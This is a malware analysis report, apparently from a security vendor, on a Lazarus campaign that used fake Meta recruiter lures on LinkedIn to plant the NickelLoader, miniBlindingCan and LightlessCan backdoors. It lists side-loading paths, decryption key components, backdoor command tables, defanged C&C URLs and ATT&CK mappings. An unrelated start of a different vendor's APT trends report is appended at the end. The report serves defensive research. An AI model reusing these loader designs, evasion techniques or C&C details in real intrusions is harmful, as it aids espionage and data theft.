Another mechanism used to minimize exposure is the employment of execution guardrails; Lazarus made sure the payload can only be decrypted on the intended victim’s machine. Execution guardrails are a set of protective protocols and mechanisms implemented to safeguard the integrity and confidentiality of the payload during its deployment and execution, effectively preventing unauthorized decryption on unintended machines, such as those of security researchers. We describe the implementation of this mechanism in the Execution chain 3: LightlessCan (complex version) section.
Attribution to the Lazarus group
The Lazarus group (also known as HIDDEN COBRA) is a cyberespionage group linked to North Korea that has been active since at least 2009. It is responsible for high-profile incidents such as both the Sony Pictures Entertainment hack and tens-of-millions-of-dollar cyberheists in 2016, the WannaCryptor (aka WannaCry) outbreak in 2017, the 3CX and X_TRADER supply-chain attacks, and a long history of disruptive attacks against South Korean public and critical infrastructure since at least 2011. The diversity, number, and eccentricity in implementation of Lazarus campaigns define this group, as well as that it performs all three pillars of cybercriminal activities: cyberespionage, cybersabotage, and pursuit of financial gain.
Aerospace companies are not an unusual target for North Korea-aligned advanced persistent threat (APT) groups. The country has conducted multiple nuclear tests and launched intercontinental ballistic missiles, which violate United Nations (UN) Security Council resolutions. The UN monitors North Korea’s nuclear activities to prevent further development and proliferation of nuclear weapons or weapons of mass destruction, and publishes biannual reports tracking such activities. According to these reports, North Korea-aligned APT groups attack aerospace companies in attempts to access sensitive technology and aerospace know-how, as intercontinental ballistic missiles spend their midcourse phase in the space outside of Earth’s atmosphere. These reports also claim that money gained from cyberattacks accounts for a portion of North Korea’s missile development costs.
We attribute the attack in Spain to the Lazarus group, specifically to Operation DreamJob, with a high level of confidence. The name for Operation DreamJob was coined in a blogpost by ClearSky from August 2020, describing a Lazarus campaign targeting defense and aerospace companies, with the objective of cyberespionage. Since then, we have loosely used the term to denote various Lazarus operations leveraging job-offering lures but not deploying tools clearly similar to those involved in its other activities, such as Operation In(ter)ception. For example, the campaign involving tools signed with 2 TOY GUYS certificates (see ESET Threat Report T1 2021, page 11), and the case of Amazon-themed lures in the Netherlands and Belgium published in September 2022.
Our attribution is based on the following factors, which show a relationship mostly with the previously mentioned Amazon-themed campaign:
1. Malware (the intrusion set):
•	Initial access was obtained by making contact via LinkedIn and then convincing the target to execute malware, disguised as a test, in order to succeed in a hiring process. This is a known Lazarus tactic, used at least since Operation DreamJob.
•	We observed new variants of payloads that were previously identified in the Dutch case from last year, such as intermediate loaders and the BlindingCan backdoor linked with Lazarus.
•	Multiple types of strong encryption were leveraged in the tools of this Lazarus campaign – AES-128 and RC6 with a 256-bit key – that were also used in the Amazon-themed campaign.
2. Infrastructure:
•	For the first-level C&C servers (listed in the Network section at the end of this blogpost), the attackers do not set up their own servers, but compromise existing ones, usually those having poor security and that host sites with neglected maintenance. This is a typical, yet weak-confidence behavior, of Lazarus.
3. Cui bono:
•	Pilfering the know-how of an aerospace company is aligned with long-term goals manifested by Lazarus.
Initial access
The group targeted multiple company employees via LinkedIn Messaging. Masquerading as a Meta recruiter, the attacker used a job offer lure to attract the target’s attention and trust; a screenshot of this conversation, which we obtained during our cooperation with the Spanish aerospace company, is depicted in Figure 1.
 Figure 1. The initial contact by the attacker impersonating a recruiter from Meta
At the beginning of Lazarus attacks, the unaware targets are usually convinced to recklessly self-compromise their systems. For this purpose, the attackers employ different strategies; for example, the target is lured to execute an attacker-provided (and trojanized) PDF viewer to see the full content of a job offer. Alternately, the target is encouraged to connect with a trojanized SSL/VPN client, being provided with an IP address and login details. Both scenarios are described in a Microsoft blogpost published in September 2022. The narrative in this case was the scammer’s request to prove the victim’s proficiency in the C++ programming language.
Two malicious executables, Quiz1.exe and Quiz2.exe, were provided for that purpose and delivered via the Quiz1.iso and Quiz2.iso images hosted on a third-party cloud storage platform. Both executables are very simple command line applications asking for input.
The first one is a Hello World project, which is a very basic program, often consisting of just a single line of code, that displays the text “Hello, World!” when executed. The second prints a Fibonacci sequence up to the largest element smaller than the number entered as input. A Fibonacci sequence is a series of numbers in which each number is the sum of the two preceding ones, typically starting with 0 and 1; however, in this malicious challenge, the sequence starts with 1 and 2. Figure 2 displays example output from the Fibonacci sequence challenge. After the output is printed, both executables trigger the malicious action of installing additional payloads from the ISO images onto the target’s system. The task for a targeted developer is to understand the logic of the program and rewrite it in the C++ programming language.
 Figure 2. The output of the decoy program Quiz2.exe
The chain of events that led to the initial compromise is sketched in Figure 3. The first payload delivered to the target’s system is an HTTP(S) downloader that we have named NickelLoader. The tool allows the attackers to deploy any desired program into the memory of the victim’s computer.
 Figure 3. The chain of events completing the initial access
Post-compromise toolset
Once NickelLoader is running on the target’s system, the attackers use it to deliver two types of RATs. One of these RATs is already known to be part of the Lazarus toolkit, specifically a variant of the BlindingCan backdoor with limited functionality but identical command processing logic. To distinguish it, we put the prefix mini- in front of the variant’s name. Additionally, the attackers introduced a RAT not previously undocumented publicly, which we have named LightlessCan.
The RATs are deployed as the final step of chains of stages with varying levels of complexity and are preceded by helper executables, like droppers and loaders. We denote an executable as a dropper if it contains an embedded payload, even if it’s not dropped onto the file system but instead loaded directly into memory and executed. Malware that doesn’t have an encrypted embedded data array, but that loads a payload from the file system, we denote as a loader.
Besides the initial quiz-related lures, Table 1 summarizes the executable files (EXEs) and dynamic link libraries (DLLs) delivered to the victim’s system. All the malware samples in the third column are trojanized open-source applications (see the fourth column for the underlying project), with a legitimate executable side-loading a malicious DLL. For example, the malicious mscoree.dll is a trojanized version of the legitimate NppyPluginDll; the DLL contains an embedded NickelLoader and is loaded by a legitimate PresentationHost.exe, both located in the C:\ProgramShared directory.
Table 1. Summary of binaries involved in the attack
Location directory	Legitimate parent process	Malicious side-loaded DLL	Trojanized project
(payload)
C:\ProgramShared\	PresentationHost.exe	mscoree.dll	NppyPluginDll
(NickelLoader)
C:\ProgramData\Adobe\	colorcpl.exe	colorui.dll	LibreSSL 2.6.5
(miniBlindingCan)
C:\ProgramData\Oracle\Java\	fixmapi.exe	mapistub.dll	Lua plugin for Notepad++ 1.4.0.0
(LightlessCan)
C:\ProgramData\Adobe\ARM\	tabcal.exe	HID.dll	MZC8051 for Notepad++ 3.2
(LightlessCan)
LightlessCan – new backdoor
The most interesting payload used in this campaign is LightlessCan, a successor of the group’s flagship HTTP(S) Lazarus RAT named BlindingCan. LightlessCan is a new complex RAT that has support for up to 68 distinct commands, indexed in a custom function table, but in the current version, 1.0, only 43 of those commands are implemented with some functionality. The remaining commands are present but have a formal implementation in the form of placeholders, lacking actual functionality. The project behind the RAT is definitely based on the BlindingCan source code, as the order of the shared commands is preserved significantly, even though there may be differences in their indexing.
The most significant update is mimicked functionality of many native Windows commands like ping, ipconfig, systeminfo, sc, net, etc. The hardcoded string “The operation completed successfully.”, the standard system message for the ERROR_SUCCESS result, brought us to that idea. Table 2 contains a list of those commands that are implemented in LightlessCan. In previously reported Lazarus attacks, as documented in blogposts by Positive Technologies in April 2021 and HvS Consulting in December 2020, these native commands are often executed in many instances after the attackers have gotten a foothold in the target’s system. However, in this case, these commands are executed discreetly within the RAT itself, rather than being executed visibly in the system console. This approach offers a significant advantage in terms of stealthiness, both in evading real-time monitoring solutions like EDRs, and postmortem digital forensic tools. The internal version number (1.0) indicates that this represents a new development effort by the attackers.
As the core utilities of Windows are proprietary and not open-source, the developers of LightlessCan faced a choice: either to reverse engineer the closed-source system binaries or to get inspired by the code available via the Wine project, where many programs are rewritten in order to mimic their execution on other platforms like Linux, macOS, or ChromeOS. We are inclined to believe the developers chose the first option, as the corresponding Wine programs they mimicked in LightlessCan were implemented a little bit differently or not at all (e.g., netsh).
Interestingly, in one of the cases we analyzed, the LightlessCan payload is stored in an encrypted file on the compromised machine, which can only be decrypted using an environment-dependent key. More details about this can be found in the Execution chain 3: LightlessCan (complex version) section. This is to ensure that the payload can only be decrypted on the computer of the intended victim and not, for example, on a device of a security researcher.
Table 2. The list of LightlessCan commands mimicking those for Windows prompt
Index	Description
33	Mimic the ipconfig command from the Windows command prompt; see Figure 4.
34	Mimic the net command from the Windows prompt; see Figure 5.
35	Mimic the netshadvfirewall firewall command from the Windows prompt; see Figure 4.
36	Mimic the netstat command from the Windows prompt.
37	Mimic the ping -6 command from the Windows prompt.
38	Mimic the reg command from the Windows prompt; see Figure 7.
39	Mimic the sc command from the Windows prompt; see Figure 8.
40	Mimic the ping command from the Windows prompt.
41	Mimic the tasklist command from the Windows prompt.
42	Mimic the wmic process call create command from the Windows prompt; see Figure 9.
43	Mimic the nslookup command from the Windows Server prompt.
44	Mimic the schstasks command from the Windows prompt; see Figure 10.
45	Mimic the systeminfo command from the Windows prompt.
46	Mimic the arp command from the Windows prompt.
47	Mimic the mkdir command from the Windows prompt.
 Figure 4. Hardcoded strings revealing the subset of the ipconfig functionality Figure 5. Hardcoded strings revealing the subset of the net functionality Figure 6. Hardcoded strings revealing the netsh firewall functionality Figure 7. Hardcoded strings revealing the (partial) reg functionality Figure 8. Hardcoded strings revealing the (partial) sc functionality Figure 9. Hardcoded strings revealing the wmic process call create functionality Figure 10. Hardcoded strings revealing the (partial) schtasks functionality
Furthermore, an examination of the RAT’s internal configuration suggests that, in comparison to BlindingCan, Lazarus increased the code sophistication in LightlessCan.
Technical analysis
In this section, we provide technical details about the compromise chain that delivers the NickelLoader downloader, and the three execution chains Lazarus used to deliver its payloads on the compromised system.
Compromise chain: NickelLoader
NickelLoader is an HTTP(S) downloader executed on the compromised system via DLL side-loading, which is later used to deliver other Lazarus payloads.
The process of delivering NickelLoader unfolds in a series of stages, commencing with the execution of PresentationHost.exe, which is triggered automatically after the target manually executes the initial quiz challenges; the Quiz1 case is depicted in Figure 3. A malicious dynamically linked library, mscoree.dll, is then side-loaded by the legitimate PresentationHost.exe – both located in C:\ProgramShared\. This DLL is a trojanized NppyPluginDll.dll, from the inactive General Python Plugins DLL for Notepad++ project from 2011. It serves as a dropper and has various exports: all the exports copied from the original NppyPluginDll.dll plus all the exports from the legitimate mscoree.dll. One of these legitimate exports, CorExitProcess, contains the malicious code responsible for the decryption and execution of the next malware stage.
To successfully decrypt an encrypted data array embedded in the dropper, three 16-character-long keywords are required by the dropper. These keywords are as follows:
1.	the name of the parent process (PresentationHost),
2.	the internal parameter hardcoded in the binary (9zCnQP6o78753qg8), and
3.	the external parameter passed on the command line ( embeddingObject), which is inherited from the parent process of PresentationHost.exe, being provided by Quiz1.exe or Quiz2.exe.
The keywords are XOR-ed byte by byte and the output forms the AES-128 decryption key.
The payload is an HTTP(S) downloader that recognizes four commands, all five letters long, shown in Table 3. Because of those five letter commands, we chose to name this payload “NickelLoader”, drawing inspiration from the colloquial term for the US five-cent coin – a nickel. The most important commands are avdrq and gabnc. When these commands are issued, each of them loads data received from the C&C server as a DLL. For this purpose, the attackers probably used MemoryModule, a library that can be used to load a DLL completely from memory.
Table 3. The list of magic keywords recognized in received buffers
Keyword	Description
abcde	Requests another immediate command without the usual long sleep delay that separates the execution of the commands.
avdrq	Loads a DLL contained in the received buffer and executes its hardcoded export info.
gabnc	Loads a DLL contained in the received buffer.
dcrqv	Terminates itself.
Execution chain 1: miniBlindingCan
One of the payloads downloaded and executed by NickelLoader is miniBlindingCan, a simplified version of the group’s flagship BlindingCan RAT. It was reported for the first time by Mandiant in September 2022, under the name AIRDRY.V2.
To load miniBlindingCan, a 64-bit malicious dynamically linked library colorui.dll is side-loaded by a legitimate colorcpl.exe executed from C:\ProgramData\Adobe\ and serves as a dropper. The DLL is obfuscated using VMProtect and contains thousands of exports from which LaunchColorCpl is the most important, as it handles the execution of the next stage. There’s an encrypted data array in the DLL’s dumped body, together with multiple debug symbols revealing the root directory and the project from which it was built:
W:\Develop\aTool\ShellCodeLoader\App\libressl-2.6.5\
As the name ShellCodeLoader suggests, the main purpose of this initial stage is to decrypt and load the data array from its body, which contains shellcode. At the beginning of its execution, ShellCodeLoader employs anti-debugging techniques by inspecting the BeingDebugged value within the Process Environment Block (PEB) structure to determine if it’s being scrutinized or analyzed by debugging tools, and utilizes anti-sandbox techniques to avoid detection within sandboxed environments designed for security analysis. The malware also explicitly checks whether its parent process is colorcpl.exe; if not, it exits immediately.
The decrypted data array is not a complete DLL, but forms an intermediate blob with two parts: shellcode followed by another encrypted data array, which represents the last step of the chain. The shellcode seems to be produced by an instance of the open-source project ShellcodeRDI – in particular, the ShellcodeRDI.c code. It was probably produced by executing the Python script ConvertToShellcode.py from this project on a payload DLL acting as a source for reflective DLL injection.
The final payload is extracted and decrypted using XOR with a long key, which is a string built by concatenating the name of the parent process (colorcpl.exe), the filename of the dropper (colorui.dll), and the external command line parameter – in this case resulting in COLORCPL.EXECOLORUI.DLL669498484488D3F22712CC5BACA6B7A7. This process is akin to what we observed with BlindingCan backdoor in the Dutch case we previously described in this WeLiveSecurity blogpost. The decryption reveals an executable with download-and-execute functionality, whose internal logic of sending and parsing commands is strongly reminiscent of BlindingCan, a flagship HTTP(S) Lazarus RAT. Unlike the case in the Netherlands, it is not VMProtect-ed and it supports only a small subset of commands available previously: compare Table 4in this blogpost and Table 3 in the blogpost on the Dutch case from September 2022. Because the features of this RAT are notably scaled down compared to those in BlindingCan, and yet they seem to share the same server-side infrastructure, we have chosen to distinguish it by appending the prefix “mini-“ to its name, highlighting its reduced functionality compared to its fully-featured RAT counterpart.
Table 4. Commands of miniBlindingCan
Command ID	Description
8201	Send system information like computer name, Windows version, and code page.
8232	Update the current communication interval with a value provided by the C&C server.
8233	Discontinue the command execution.
8241	Send the current configuration of size 9,392 bytes to the C&C server.
8242	Update the configuration of size 9,392 bytes, stored encrypted on the file system.
8247	Wait for the next command.
8248	Update the current communication interval with a value stored in the configuration.
8274	Download and decrypt a file from the C&C server.
8279	Execute shellcode passed as a parameter.
Figure 11 shows the decrypted state of a 9,392-byte-long configuration embedded in the RAT. It contains five URLs, in this case compromised websites, each limited by a maximum size of 260 wide characters.
 Figure 11. A configuration of the miniBlindingCan backdoor. The highlighted value is the count of URLs, but only the first and the last of the five URLs are shown here. The purpose of the last two wide strings is not known
Execution chain 2: LightlessCan (simple version)
Another payload we have seen executed by NickelLoader is LightlessCan, a new Lazarus backdoor. We have observed two different chains loading this backdoor.
In the simple version of the chain, the dropper of this payload is the malicious dynamically linked library mapistub.dll that is side-loaded by the legitimate fixmapi.exe executed from C:\ProgramData\Oracle\Java\. The DLL is a trojanized Lua plugin, version 1.4, with all the exports copied from the legitimate Windows mapi32.dll. The export FixMAPI contains malicious code responsible for decrypting and loading the next stage; all the other exports contain benign code sourced from a publicly available MineSweeper sample project. This mapistub.dll dropper has persistence established via a scheduled task. Unfortunately, we lack additional details about this task, except that its parent process appears as %WINDOWS%\system32\svchost.exe -k netsvcs -p -s Schedule.
To successfully decrypt the embedded data array, the dropper needs three keywords to be provided correctly:
1.	the name of the parent process (fixmapi.exe),
2.	the internal parameter hardcoded in the binary (IP7pdINfE9uMz63n), and
3.	the external parameter passed in the command line (AudioEndpointBuilder).
The keywords are XOR-ed byte by byte and the output forms a 128-bit AES key to be used for decryption. Note that the length of the keywords are not all exactly 16 bytes, but the decryption process will still work if the oversized string is truncated to a 16-byte length (for instance, AudioEndpointBuilder to AudioEndpointBui), and the undersized string, fixmapi.exe, is treated as fixmapi.exe\x00\x00\x00\x00\x00, because the string was initialized as 260 instances of the NUL character.
Execution chain 3: LightlessCan (complex version)
The most complex chain we observed on the compromised system also delivers LightlessCan, with various components involved in the complete chain of installation stages: a legitimate application, an initial dropper, a complete dropper (which contains the configuration), an intermediate dropper, a configuration file, a file with system information (for the decryption of encrypted payloads on the file system), an intermediate loader and the final step, the LightlessCan RAT. The connections and relationships among these files are illustrated in Figure 12.
 Figure 12. A complex chain of stages delivering the fourth payload
The initial dropper of the fourth chain is a malicious dynamically linked library HID.dll that is side-loaded by a legitimate executable, tabcal.exe, executed from C:\ProgramData\Adobe\ARM\. The DLL is a trojanized version of MZC8051.dll, a legitimate file from the 8051 C compiler plugin project for Notepad++. It contains all the exports from the original project, but also the necessary exports from the legitimate Hid User Library by Microsoft, so that the side-loading by tabcal.exe will be successful. The export HidD_GetHidGuid contains the malicious code responsible for dropping the next stage and, as in the case of the dropper of the previous chain (Execution chain 2), all the other exports contain the benign MineSweeper code.
As in the previous cases, three long keywords must be provided to decrypt the embedded payload:
1.	the name of the parent process (tabcal.exe),
2.	the internal parameter hardcoded in the binary (9zCnQP6o78753qg8), and
3.	the external parameter (LocalServiceNetworkRestricted) – this time not expressed as a command line parameter, but instead as the content of a file located at %WINDOWS%\system32\thumbs.db.
Again, the keywords are XOR-ed byte by byte and the output forms a 128-bit AES key to be used for the decryption. As in the previous case, the lengths of the keywords are not all exactly 16 bytes, but the decryption will still work if the oversized string is truncated (for instance, to LocalServiceNetw) and the undersized string is extended with nulls (for instance, to tabcal.exe\x00\x00\x00\x00\x00\x00).
The executable produced by the above recipe is the complete dropper from Figure 12 and has the InternalName resource AppResolver.dll (found in the VERSIONINFO resource). It contains two encrypted data arrays: a small one of 126 bytes, and a large one of 1,807,464 bytes (which contains three subparts). First, it decrypts the small array using the RC6 algorithm with the hardcoded 256-bit key DA 48 A3 14 8D BF E2 D2 EF 91 12 11 FF 75 59 A3 E1 6E A0 64 B8 78 89 77 A0 37 91 58 5A FF FF 07. The output represents paths to which the first two subparts of the large blob are dropped (i.e., LightlessCan and the intermediate dropper), and yields the strings C:\windows\system32\oci.dll and C:\windows\system32\grpedit.dat.
Next, it continues with decrypting the second data array – the large blob – using the same encryption key as before. The result is a decrypted blob containing three subparts: a DLL corresponding to grpedit.dat (LightlessCan), a DLL corresponding to oci.dll (the intermediate dropper), and a 14,948 byte encrypted file dropped to %WINDOWS%\System32\wlansvc.cpl (configuration); as depicted in Figure 13.
 Figure 13. The decrypted configuration stored in wlansvc.cpl
Moreover, the complete dropper also stores several characteristics identifying the compromised system in the file %WINDOWS%\System32\4F59FB87DF2F, whose name is hardcoded in the binary. These characteristics are primarily retrieved from the Computer\HKLM\HARDWARE\DESCRIPTION\System\BIOS registry path. Here are the specific values of these characteristics, along with a PowerShell command provided in brackets that can be used to display the corresponding value on any Windows machine:
•	SystemBIOSDate (Get-ItemProperty "HKLM:\HARDWARE\Description\System\BIOS" -Name BIOSReleaseDate | Select-Object -Property BIOSReleaseDate)
•	SystemBIOSVersion (Get-CimInstance -ClassName Win32_Bios | Select-Object -Property Version)
•	SystemManufacturer (Get-CimInstance -ClassName Win32_ComputerSystem | Select-Object -Property Manufacturer)
•	SystemProductName (Get-CimInstance -ClassName Win32_ComputerSystemProduct | Select-Object -Property Name)
•	Identifier in Computer\HKEY_LOCAL_MACHINE\HARDWARE\DESCRIPTION\System\MultifunctionAdapter\0\DiskController\0\DiskPeripheral\0
The concatenation of the values is required for decryption of the encrypted grpedit.dat from the file system. On a test machine running an image of Windows 10 on VMWare, the output can be:
11/12/20INTEL - 6040000VMware, Inc.VMware Virtual Platform656ba047-20b25a2a-A
The oci.dll file is another dropping layer – the intermediate dropper that drops the intermediate loader, which is a payload similar to the one described in the previously mentioned Dutch case. Again, the attackers used an open-source project, the Flashing Tip plugin for Notepad++, which is no longer available online. Unlike the previous cases, only two long keywords must be provided in order to decrypt the embedded payload successfully using AES-128:
1.	the name of the parent process (msdtc.exe), and
2.	the internal parameter hardcoded in the binary (fb5XPNCr8v83Y85P).
Both keywords are XOR-ed byte by byte (the parent process name is truncated, or padded with NULLs, as necessary to fill 16 bytes). The product of the decryption is the intermediate loader (LLTMapperAPI.dll). It uses the system information (same as the values stored in 4F59FB87DF2F) to decrypt the configuration file wlansvc.cpl and to locate, decrypt, and load the encrypted grpedit.dat, which is LightlessCan, the new full-featured RAT.
Conclusion
We have described a new Lazarus attack that originated on LinkedIn where fake recruiters approached their potential victims, who were using corporate computers for personal purposes. Even though public awareness of these types of attacks should be high, the success rates of these campaigns have still not dropped to zero.
The most worrying aspect of the attack is the new type of payload, LightlessCan, a complex and possibly evolving tool that exhibits a high level of sophistication in its design and operation, representing a significant advancement in malicious capabilities compared to its predecessor, BlindingCan.
The attackers can now significantly limit the execution traces of their favorite Windows command line programs that are heavily used in their post-compromise activity. This maneuver has far-reaching implications, impacting the effectiveness of both real-time monitoring solutions and of post-mortem digital forensic tools.
IoCs
Files
SHA-1	Filename	Detection	Description
C273B244EA7DFF20B1D6B1C7FD97F343201984B3	%TEMP%\7zOC35416EE\Quiz1.exe	Win64/NukeSped.KT	An initial dropper disguised as a “Hello World” challenge that triggers the compromise.
38736CA46D7FC9B9E5C74D192EEC26F951E45752	%TEMP%\7zOCB3CC96D\Quiz2.exe	Win64/NukeSped.KT	An initial dropper disguised as a “Fibonacci sequence” challenge that triggers the compromise.

C830B895FB934291507E490280164CC4234929F0	%ALLUSERSPROFILE%\Adobe\colorui.dll	Win64/NukeSped.KV	A VMProtect-ed dropper side-loaded by the legitimate colorcpl.exe. It contains the debug information string W:\Develop\aTool\ShellCodeLoader\App\libressl-2.6.5.
8CB37FA97E936F45FA8ECD7EB5CFB68545810A22	N/A	Win64/NukeSped.KU	The miniBlindingCan backdoor dropped by colorui.dll.
0F33ECE7C32074520FBEA46314D7D5AB9265EC52	%ALLUSERSPROFILE%\Oracle\Java\mapistub.dll	Win64/NukeSped.KW	A dropper of LightlessCan, side-loaded by the legitimate fixmapi.exe.
C7C6027ABDCED3093288AB75FAB907C598E0237D	N/A	Win64/NukeSped.KW	A LightlessCan backdoor dropped by mapistub.dll.
C136DD71F45EAEF3206BF5C03412195227D15F38	C:\ProgramShared\mscoree.dll	Win64/NukeSped.KT	A dropper of NickelLoader, side-loaded by PresentationHost.exe. It is dropped by both quiz-related samples: C273B244EA7DFF20B1D6B1C7FD97F343201984B3 and 38736CA46D7FC9B9E5C74D192EEC26F951E45752.
E61672B23DBD03FE3B97EE469FA0895ED1F9185D	N/A	Win64/NukeSped.KT	An HTTPS downloader we’ve named NickelLoader, dropped by mscoree.dll.
E18B9743EC203AB49D3B57FED6DF5A99061F80E0	%ALLUSERSPROFILE%\Adobe\ARM\HID.dll	Win64/NukeSped.KX	An initial dropper side-loaded by the legitimate tabcal.exe.
10BD3E6BA6A48D3F2E056C4F974D90549AED1B96	N/A	Win64/NukeSped.KT	The complete dropper AppResolver.dll dropped by HID.dll in the complex chain of LightlessCan delivery.
3007DDA05CA8C7DE85CD169F3773D43B1A009318	%WINDIR%\system32\grpedit.dat	Win64/NukeSped.KW	A LightlessCan backdoor dropped in the complex chain of its delivery.
247C5F59CFFBAF099203F5BA3680F82A95C51E6E	%WINDIR%\system32\oci.dll	@Trojan.Win64/NukeSped.MI	The intermediate dropper dropping the intermediate loader in the complex chain of the LightlessCan delivery.
EBD3EF268C71A0ED11AE103AA745F1D8A63DDF13	N/A	Win64/NukeSped.KT	The intermediate loader of LightlessCan.
Network
IP	Domain	Hosting provider	First seen	Details
46.105.57[.]169	bug.restoroad[.]com	OVH SAS	2021 10 10	A compromised legitimate site hosting the C&C server:
http://bug.restoroad[.]com/admin/view_status.php
50.192.28[.]29	hurricanepub[.]com	Comcast Cable Communications, LLC	2020 01 06	A compromised legitimate site hosting the C&C server:
https://hurricanepub[.]com/include/include.php
67.225.140[.]4	turnscor[.]com	Liquid Web, L.L.C	2020 01 03	A compromised legitimate WordPress-based site hosting the C&C server:
https://turnscor[.]com/wp-includes/contacts.php
78.11.12[.]13	mantis.quick.net[.]pl	Netia SA	2021 03 22	A compromised legitimate site hosting the C&C server:
http://mantis.quick.net[.]pl/library/securimage/index.php
89.187.86[.]214	www.radiographers[.]org	Coreix Ltd	2020 10 23	A compromised legitimate site hosting the C&C server:
https://www.radiographers[.]org/aboutus/aboutus.php
118.98.221[.]14	kapata-arkeologi.kemdikbud.go[.]id	Pustekkom	2020 01 02	A compromised legitimate site hosting the C&C server:
https://kapata-arkeologi.kemdikbud.go[.]id/pages/payment/payment.php
160.153.33[.]195	barsaji.com[.]mx	GoDaddy.com, LLC	2020 03 27	A compromised legitimate site hosting the C&C server:
http://barsaji.com[.]mx/src/recaptcha/index.php
175.207.13[.]231	www.keewoom.co[.]kr	Korea Telecom	2021 01 17	A compromised legitimate site hosting the C&C server:
http://www.keewoom.co[.]kr/prod_img/201409/prod.php
178.251.26[.]65	kerstpakketten.horesca-meppel[.]nl	InterRacks B.V.	2020 11 02	A compromised legitimate WordPress-based site hosting the C&C server:
https://kerstpakketten.horesca-meppel[.]nl/wp-content/plugins/woocommerce/lib.php
185.51.65[.]233	kittimasszazs[.]hu	DoclerNet Operations, ORG-DHK1-RIPE	2020 02 22	A compromised legitimate site hosting the C&C server:
https://kittimasszazs[.]hu/images/virag.php
199.188.206[.]75	nrfm[.]lk	Namecheap, Inc.	2021 03 13	A compromised legitimate WordPress-based site hosting the C&C server:
https://nrfm[.]lk/wp-includes/SimplePie/content.php
MITRE ATT&CK techniques
This table was built using version 13 of the MITRE ATT&CK framework.
Tactic	ID	Name	Description
Reconnaissance	T1593.001
Search Open Websites/Domains: Social Media	Lazarus attackers used LinkedIn to identify and contact specific employees of a company of interest.
Resource Development	T1584.004
Acquire Infrastructure: Server	Compromised servers were used by the Lazarus HTTP(S) backdoors and the downloader for C&C.
	T1585.001
Establish Accounts: Social Media Accounts	Lazarus attackers created a fake LinkedIn identity of a headhunter from Meta.
	T1585.003
Establish Accounts: Cloud Accounts	Lazarus attackers had to create an account on a third-party cloud storage in order to deliver the initial ISO images.
	T1587.001
Develop Capabilities: Malware	Custom tools from the attack are likely developed by the attackers. Some exhibit highly specific kernel development capacities seen earlier in Lazarus tools.
	T1608.001
Stage Capabilities: Upload Malware	Lazarus attackers uploaded the initial ISO images to a cloud storage.
Initial Access	T1566.002
Phishing: Spearphishing Link	The target received a link to a third-party remote storage with malicious ISO images.
	T1566.003
Phishing: Spearphishing via Service	The target was contacted via LinkedIn Messaging.
Execution	T1106
Native API	Windows APIs are essential for miniBlindingCan and LightlessCan to function and are resolved dynamically at runtime.
	T1053
Scheduled Task/Job	Based on the parent process, a scheduled task was probably created to trigger thesimple chain of the LightlessCan execution.
	T1129
Shared Modules	NickelLoader can load and execute an arbitrary DLL within memory.
	T1204.002
User Execution: Malicious File	Lazarus attackers relied on the execution of Quiz1.exe and Quiz2.exe from the ISO files.
	T1047
Windows Management Instrumentation	One of the LightlessCan commands allows creation of a new process via WMI.
Persistence	T1053
Scheduled Task/Job	Based on the parent process, a scheduled task was probably created to trigger the simple chain of the LightlessCan execution. Moreover, LightlessCan can mimic the schtasks command.
Defense Evasion	T1134.002
Access Token Manipulation: Create Process with Token	LightlessCan can create a new process in the security context of the user represented by the specified token and collect the output.
	T1622
Debugger Evasion	There’s an anti-debug check in the dropper of miniBlindingCan.
	T1480
Execution Guardrails	There’s a parent process check in the miniBlindingCan dropper. The concatenation of the values is required for decryption of the encrypted LightlessCan from the file system.
	T1140
Deobfuscate/Decode Files or Information	Many of these Lazarus tools and configurations are encrypted on the file system, e.g., LightlessCan in grpedit.dat and its configuration in wlansvc.cpl.
	T1574.002
Hijack Execution Flow: DLL Side-Loading	Many of the Lazarus droppers and loaders use a legitimate program for their loading.
	T1027.002
Obfuscated Files or Information: Software Packing	Lazarus obfuscated several executables by VMProtect in this attack, e.g., colorui.dll
	T1027.007
Obfuscated Files or Information: Dynamic API Resolution	Both LightlessCan and miniBlindingCan resolve Windows APIs dynamically.
	T1027.009
Obfuscated Files or Information: Embedded Payloads	The droppers of all malicious chains contain an embedded data array with an additional stage.
	T1562.003
Impair Defenses: Impair Command History Logging	New features of LightlessCan mimic the most useful Windows command line utilities, to avoid executing the original console utilities.
	T1562.004
Impair Defenses: Disable or Modify System Firewall	LightlessCan can mimic the netsh command and interact with firewall rules.
	T1070.004
Indicator Removal: File Deletion	LightlessCan has the ability to delete files securely.
	T1070.006
Indicator Removal: Timestomp	LightlessCan can alter the modification timestamps of files.
	T1202
Indirect Command Execution	LightlessCan bypasses command execution by implementing their functionality.
	T1055
Process Injection	LightlessCan and miniBlindingCan use various types of process injection.
	T1497.003
Virtualization/Sandbox Evasion: Time Based Evasion	The miniBlindingCan dropper has an intentional initial execution delay.
	T1620
Reflective Code Loading	Most of the droppers use reflective DLL injection.
Discovery	T1083
File and Directory Discovery	LightlessCan can locate a file by its name.
	T1135
Network Share Discovery	LightlessCan can mimic the net share command.
	T1057
Process Discovery	LightlessCan identifies processes by name.
	T1012
Query Registry	LightlessCan queries the registry for various system information it uses for encryption.
	T1018
Remote System Discovery	LightlessCan can mimic the net view command.
	T1016
System Network Configuration Discovery	LightlessCan can mimic the arp and ipconfig commands.
	T1049
System Network Connections Discovery	LightlessCan can mimic the netstat command.
	T1007
System Service Discovery	LightlessCan can mimic the sc query and tasklist commands.
Command and Control	T1071.001
Application Layer Protocol: Web Protocols	NickelLoader, LightlessCan, and miniBlindingCan use HTTP and HTTPS for C&C.
	T1573.001
Encrypted Channel: Symmetric Cryptography	LightlessCan and miniBlindingCan encrypt C&C traffic using the AES-128 algorithm.
	T1132.001
Data Encoding: Standard Encoding	LightlessCan and miniBlindingCan encode C&C traffic using base64.
Exfiltration	T1041
Exfiltration Over C2 Channel	LightlessCan can exfiltrate data to its C&C server.






APT trends report Q2 2023
APT REPORTS
27 JUL 2023
 11 minute read
 
AUTHORS
•	 GREAT
For more than six years, the Global Research and Analysis Team (GReAT) at Kaspersky has been publishing quarterly summaries of advanced persistent threat (APT) activity. These summaries are based on our threat intelligence research; and they provide a representative snapshot of what we have published and discussed in greater detail in our private APT reports. They are designed to highlight the significant events and findings that we feel people should be aware of.
This is our latest installment, focusing on activities that we observed during Q2 2023.
Readers who would like to learn more about our intelligence reports or request more information on a specific report, are encouraged to contact intelreports@kaspersky.com.
The most remarkable findings
